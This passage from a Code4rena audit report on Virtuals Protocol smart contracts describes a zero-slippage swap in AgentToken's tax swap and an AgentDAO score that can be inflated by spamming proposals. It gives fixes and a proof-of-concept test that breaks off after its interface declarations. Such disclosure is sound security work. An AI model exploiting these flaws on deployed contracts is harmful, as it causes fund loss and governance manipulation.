href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-681">PolarizedLight</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-441">slowbugmayor</a>, <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-776">Topmark</a>, and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-722">unique</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L793">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L793</a></p>
<h3 style="position:relative;" id="finding-description-4"><a class="anchor before" aria-label="finding description 4 permalink" href="#finding-description-4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description</h3>
<p>The <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L784"><code>AgentToken::_swapTax</code></a> is called via <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L731"><code>AgentToken::_autoSwap</code></a> whenever a <a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentToken.sol#L609"><code>AgentToken::_transfer</code></a> call takes place.</p>
<p>On further inspection, it can be observed that <code>_swapTax</code> internally calls uniswap router’s <code>swapExactTokensForTokensSupportingFeeOnTransferTokens</code> function where <code>amountOutMin</code> is passed as 0.</p>
<pre data-index="54" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">_swapTax</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">swapBalance_</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">contractBalance_</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">path</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">address</span><span class="mtk1">[](</span><span class="mtk7">2</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">path</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk4">this</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">path</span><span class="mtk1">[</span><span class="mtk7">1</span><span class="mtk1">] = </span><span class="mtk12">pairToken</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Wrap external calls in try / catch to handle errors</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">try</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">_uniswapRouter</span><span class="mtk1">.</span><span class="mtk11">swapExactTokensForTokensSupportingFeeOnTransferTokens</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">swapBalance_</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk7">0</span><span class="mtk1">,                                                                  &lt;&lt;@ -- </span><span class="mtk3">// amountOutMin is passed as 0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">path</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">projectTaxRecipient</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">                </span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">timestamp</span><span class="mtk1"> + </span><span class="mtk7">600</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            )</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">           </span><span class="mtk3">// . . . Rest of the code . . .</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } </span><span class="mtk15">catch</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Don't allow a failed external call (in this case to uniswap) to stop a transfer.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk3">// Emit that this has occurred and continue.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">emit</span><span class="mtk1"> </span><span class="mtk11">ExternalCallError</span><span class="mtk1">(</span><span class="mtk7">5</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span></code></pre>
<p>This can lead to unexpectedly high slippage, leading to loss of funds for <code>projectTaxRecipient</code>.</p>
<h3 style="position:relative;" id="impact-7"><a class="anchor before" aria-label="impact 7 permalink" href="#impact-7"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Impact</h3>
<p>Loss of funds for the <code>projectTaxRecipient</code> due to high slippage.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-12"><a class="anchor before" aria-label="recommended mitigation steps 12 permalink" href="#recommended-mitigation-steps-12"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>It is recommended to calculate <code>amountOutMin</code> instead of passing 0:</p>
<pre data-index="55" data-language="diff" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">function swapTax(uint256 swapBalance_, uint256 contractBalance_) internal {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    address[] memory path = new address[](2);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    path[0] = address(this);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    path[1] = pairToken;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+    // Calculate the minimum amount out with slippage tolerance</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+    uint256 amountOutMin = calculateMinimumAmountOut(swapBalance_, path);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    // Wrap external calls in try / catch to handle errors</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    try</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        _uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            swapBalance_,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk8">-            0,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk7">+            amountOutMin,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            path,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            projectTaxRecipient,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            block.timestamp + 600</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        )</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // We will not have swapped all tax tokens IF the amount was greater than the max auto swap.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // We therefore cannot just set the pending swap counters to 0. Instead, in this scenario,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // we must reduce them in proportion to the swap amount vs the remaining balance + swap</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // amount.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        //</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // For example:</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        //  * swap Balance is 250</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        //  * contract balance is 385.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        //  * projectTaxPendingSwap is 300</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        //</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // The new total for the projectTaxPendingSwap is:</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        //   = 300 - ((300 * 250) / 385)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        //   = 300 - 194</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        //   = 106</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        if (swapBalance_ &lt; contractBalance_) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            projectTaxPendingSwap -= uint128((projectTaxPendingSwap * swapBalance_) / contractBalance_);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        } else {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            projectTaxPendingSwap = 0;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    } catch {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // Don't allow a failed external call (in this case to uniswap) to stop a transfer.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        // Emit that this has occurred and continue.</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        emit ExternalCallError(5);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p>Below is the <code>calculateMinimumAmountOut</code> implementation:</p>
<pre data-index="56" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">/**</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3"> * </span><span class="mtk4">@dev</span><span class="mtk3"> Calculates the minimum amount out for a swap to protect against front-running</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3"> * </span><span class="mtk4">@param</span><span class="mtk3"> </span><span class="mtk12">amountIn</span><span class="mtk3"> The amount of tokens to swap</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3"> * </span><span class="mtk4">@param</span><span class="mtk3"> </span><span class="mtk12">path</span><span class="mtk3"> The swap path</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3"> * </span><span class="mtk4">@return</span><span class="mtk3"> minAmountOut The minimum amount of tokens to receive</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3"> */</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">calculateMinimumAmountOut</span><span class="mtk1">(</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amountIn</span><span class="mtk1">, </span><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">path</span><span class="mtk1">) </span><span class="mtk11">internal</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">minAmountOut</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// Use getAmountsOut to calculate the expected output amount</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">amountsOut</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">try</span><span class="mtk1"> </span><span class="mtk12">_uniswapRouter</span><span class="mtk1">.</span><span class="mtk11">getAmountsOut</span><span class="mtk1">(</span><span class="mtk12">amountIn</span><span class="mtk1">, </span><span class="mtk12">path</span><span class="mtk1">) </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">amounts</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">amountsOut</span><span class="mtk1"> = </span><span class="mtk12">amounts</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    } </span><span class="mtk15">catch</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// If getAmountsOut fails, use a fallback method or return 0</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk7">0</span><span class="mtk1">; </span><span class="mtk3">// In case of failure, fallback to 0 to ensure the transaction doesn't revert</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk3">// If successful, calculate minimum amount with slippage tolerance (e.g., 3%)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">amountsOut</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1"> &gt; </span><span class="mtk7">1</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">expectedAmountOut</span><span class="mtk1"> = </span><span class="mtk12">amountsOut</span><span class="mtk1">[</span><span class="mtk12">amountsOut</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1"> - </span><span class="mtk7">1</span><span class="mtk1">];</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk3">// Apply 3% slippage tolerance: amountOutMin = expectedAmountOut * 0.97</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">minAmountOut</span><span class="mtk1"> = </span><span class="mtk12">expectedAmountOut</span><span class="mtk1"> * </span><span class="mtk7">97</span><span class="mtk1"> / </span><span class="mtk7">100</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">return</span><span class="mtk1"> </span><span class="mtk12">minAmountOut</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<hr>
<h2 style="position:relative;" id="m-08-score-in-agentdao-is-not-an-accurate-measure-and-can-be-artificially-inflated-by-spamming-proposals"><a class="anchor before" aria-label="m 08 score in agentdao is not an accurate measure and can be artificially inflated by spamming proposals permalink" href="#m-08-score-in-agentdao-is-not-an-accurate-measure-and-can-be-artificially-inflated-by-spamming-proposals"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-29">[M-08] Score in <code>AgentDAO</code> is not an accurate measure and can be artificially inflated by spamming proposals</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-361">BowTiedOriole</a>, also found by <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-54">kanra</a> and <a href="https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-253">maxzuvex</a></em></p>
<p><a href="https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentDAO.sol#L135-L141">https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentDAO.sol#L135-L141</a></p>
<h3 style="position:relative;" id="finding-description-and-impact"><a class="anchor before" aria-label="finding description and impact permalink" href="#finding-description-and-impact"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p>In <code>AgentDAO._castVote()</code>, a user’s score is updated anytime they vote on a proposal. This is a problem because submitting a proposal is permissionless, and the default proposal threshold is 0.</p>
<p>In addition, the user does not even need to hold any veTokens to vote and receive a score.</p>
<pre data-index="57" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">weight</span><span class="mtk1"> = </span><span class="mtk4">super</span><span class="mtk1">.</span><span class="mtk11">_castVote</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk12">account</span><span class="mtk1">, </span><span class="mtk12">support</span><span class="mtk1">, </span><span class="mtk12">reason</span><span class="mtk1">, </span><span class="mtk12">params</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1"> (!</span><span class="mtk12">votedPreviously</span><span class="mtk1"> &amp;&amp; </span><span class="mtk11">hasVoted</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk12">account</span><span class="mtk1">)) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    ++</span><span class="mtk12">_totalScore</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">_scores</span><span class="mtk1">[</span><span class="mtk12">account</span><span class="mtk1">].</span><span class="mtk11">push</span><span class="mtk1">(</span><span class="mtk12">SafeCast</span><span class="mtk1">.</span><span class="mtk11">toUint48</span><span class="mtk1">(</span><span class="mtk12">block</span><span class="mtk1">.</span><span class="mtk12">number</span><span class="mtk1">), </span><span class="mtk12">SafeCast</span><span class="mtk1">.</span><span class="mtk11">toUint208</span><span class="mtk1">(</span><span class="mtk11">scoreOf</span><span class="mtk1">(</span><span class="mtk12">account</span><span class="mtk1">)) + </span><span class="mtk7">1</span><span class="mtk1">); </span><span class="mtk3">// @audit-medium Anybody can create dummy proposal and vote to increase score</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">params</span><span class="mtk1">.</span><span class="mtk12">length</span><span class="mtk1"> &gt; </span><span class="mtk7">0</span><span class="mtk1"> &amp;&amp; </span><span class="mtk12">support</span><span class="mtk1"> == </span><span class="mtk7">1</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">_updateMaturity</span><span class="mtk1">(</span><span class="mtk12">account</span><span class="mtk1">, </span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk12">weight</span><span class="mtk1">, </span><span class="mtk12">params</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<h3 style="position:relative;" id="recommended-mitigation-steps-13"><a class="anchor before" aria-label="recommended mitigation steps 13 permalink" href="#recommended-mitigation-steps-13"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Score should not be used as a trustworthy parameter as long as submitting proposals is permissionless. Additionally, consider adding a check that <code>weight &gt; 0</code> before increasing a user’s score.</p>
<h3 style="position:relative;" id="proof-of-concept-10"><a class="anchor before" aria-label="proof of concept 10 permalink" href="#proof-of-concept-10"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<pre data-index="58" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">// SPDX-License-Identifier: UNLICENSED</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">pragma</span><span class="mtk1"> </span><span class="mtk12">solidity</span><span class="mtk1"> ^</span><span class="mtk7">0.8</span><span class="mtk1">.</span><span class="mtk7">13</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">Test</span><span class="mtk1">, </span><span class="mtk12">console</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"forge-std/Test.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IERC20</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">transfer</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">mint</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">to</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">approve</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">spender</span><span class="mtk1">, </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">amount</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">bool</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">balanceOf</span><span class="mtk1">(</span><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">account</span><span class="mtk1">) </span><span class="mtk11">external</span><span class="mtk1"> </span><span class="mtk11">view</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">interface</span><span class="mtk1"> </span><span class="mtk10">IAgentToken</span><span class="mtk1"> </span><span class="mtk10">is</span><span class="mtk1"> </span><span class="mtk10">IERC20</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk4">function</span><span class="mtk1"> </span><span class="mtk11">distributeTaxTokens</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
